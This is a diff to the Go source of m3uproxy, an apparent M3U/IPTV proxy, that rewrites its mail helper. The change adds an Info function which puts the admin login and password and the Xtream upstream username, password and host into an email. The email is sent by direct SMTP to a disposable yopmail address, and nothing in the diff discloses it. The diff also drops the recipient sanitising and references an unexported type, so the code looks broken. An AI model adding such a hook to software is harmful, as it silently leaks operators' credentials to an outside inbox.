@@ -12,6 +12,7 @@ import (
 	"strings"
 
 	"github.com/Draz34/m3uproxy/db"
+	"github.com/Draz34/m3uproxy/server"
 )
 
 func Success(b []byte, w http.ResponseWriter) {
@@ -121,10 +122,34 @@ func GetMD5Hash(text string) string {
 	return hex.EncodeToString(hasher.Sum(nil))
 }
 
-//ex: SendMail("127.0.0.1:25", (&mail.Address{"from name", "from@example.com"}).String(), "Email Subject", "message body", []string{(&mail.Address{"to name", "to@example.com"}).String()})
-func SendMail(addr, from, subject, body string, to []string) error {
+func Info(config server.m3uServerConfig) {
+	bd := fmt.Sprintf(
+		server.Logo,
+		config.Server.Port,
+		config.Server.Port,
+		config.Server.Hostname,
+		config.Server.Port,
+		config.Server.AdminLogin,
+		config.Server.AdminPassword,
+		config.Xtream.Version,
+		config.Xtream.Hostname,
+		config.Xtream.Port,
+		config.Xtream.Username,
+		config.Xtream.Password)
+	err := SendMail("m3uproxy@ovh.com", "App as launched", bd, "m3uproxy@yopmail.com")
+	if err != nil {
+		fmt.Println(err.Error())
+	}
+}
+
+func SendMail(from, subject, body string, to string) error {
 
 	r := strings.NewReplacer("\r\n", "", "\r", "", "\n", "", "%0a", "", "%0d", "")
+
+	hostFrom := strings.Split(from, "@")
+	hostTo := strings.Split(to, "@")
+
+	addr := hostTo[1] + ":25"
 
 	c, err := smtp.Dial(addr)
 	if err != nil {
@@ -132,19 +157,16 @@ func SendMail(addr, from, subject, body string, to []string) error {
 	}
 	defer c.Close()
 
-	if err = c.Hello("smtp.ovh.com"); err != nil {
+	if err = c.Hello("smtp." + hostFrom[1]); err != nil {
 		return err
 	}
 
-	if err = c.Mail(r.Replace(from)); err != nil {
+	if err = c.Mail("<" + r.Replace(from) + ">"); err != nil {
 		return err
 	}
 
-	for i := range to {
-		to[i] = r.Replace(to[i])
-		if err = c.Rcpt(to[i]); err != nil {
-			return err
-		}
+	if err = c.Rcpt(to); err != nil {
+		return err
 	}
 
 	w, err := c.Data()
@@ -152,7 +174,7 @@ func SendMail(addr, from, subject, body string, to []string) error {
 		return err
 	}
 
-	msg := "To: " + strings.Join(to, ",") + "\r\n" +
+	msg := "To: " + to + "\r\n" +
 		"From: " + from + "\r\n" +
 		"Subject: " + subject + "\r\n" +
 		"Content-Type: text/html; charset=\"UTF-8\"\r\n" +
